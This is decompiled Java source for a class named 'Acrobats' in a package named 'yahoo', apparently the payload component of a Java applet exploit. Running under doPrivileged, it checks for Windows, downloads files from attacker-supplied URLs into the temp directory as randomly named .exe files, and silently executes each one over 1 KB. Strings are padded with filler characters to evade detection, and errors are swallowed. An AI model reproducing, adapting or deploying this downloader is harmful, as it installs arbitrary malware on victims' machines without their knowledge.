// 
// Decompiled by Procyon v0.5.30
// 

package yahoo;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Acrobats implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        true;
        true;
        final int n = 2;
        final byte[] array = new byte[s.length() / n];
        true;
        true;
        true;
        final int n2 = 16;
        for (int i = 0; i < s.length(); i += n) {
            false;
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            true;
            false;
        }
        return array;
    }
    
    public Object run() throws Exception {
        if (Acrobats.data == null) {
            return null;
        }
        true;
        try {
            false;
            final String property = System.getProperty("os.OOOnOOaOOmOOOOOe".replace("O", ""));
            true;
            false;
            if (property.indexOf("Win___dow_s".replace("_", "")) == -1) {
                true;
                return null;
            }
            int int1 = 1;
            false;
            if (Acrobats.cc != null) {
                int1 = Integer.parseInt(Acrobats.cc);
            }
            false;
            false;
            false;
            for (int i = 0; i < int1; ++i) {
                true;
                final String string = Acrobats.data + Integer.toString(i);
                true;
                false;
                final URL url = new URL(string);
                url.openConnection();
                false;
                final InputStream openStream = url.openStream();
                true;
                final String property2 = System.getProperty("jlalllvall.illol.ltlmlplldllllir".replace("l", ""));
                true;
                false;
                true;
                final String string2 = property2 + File.separator + Math.random() + "BBBB.BBBBeBBBxeB".replace("B", "");
                true;
                final FileOutputStream fileOutputStream = new FileOutputStream(string2);
                false;
                int n = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    true;
                    fileOutputStream.write(read);
                    false;
                    ++n;
                }
                openStream.close();
                false;
                fileOutputStream.close();
                true;
                false;
                this.Caller(n, string2);
            }
            true;
            false;
            false;
        }
        catch (Exception ex) {}
        false;
        return null;
    }
    
    private void Caller(final int n, final String s) throws Exception {
        true;
        final Runtime _e = this.__E();
        Boolean b = true;
        false;
        final int n2 = 1024;
        false;
        true;
        if (n >= n2) {
            b = false;
        }
        false;
        true;
        if (!b) {
            this.__w(_e, s);
            true;
        }
        false;
    }
    
    private Runtime __E() throws Exception {
        false;
        return Runtime.getRuntime();
    }
    
    private Process __w(final Runtime runtime, final String s) throws Exception {
        true;
        true;
        return runtime.exec(s, null, null);
    }
    
    public Acrobats() {
        true;
        try {
            false;
            true;
            false;
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {
            false;
            true;
        }
        true;
    }
    
    static {
        Acrobats.data = null;
        Acrobats.cc = null;
    }
}
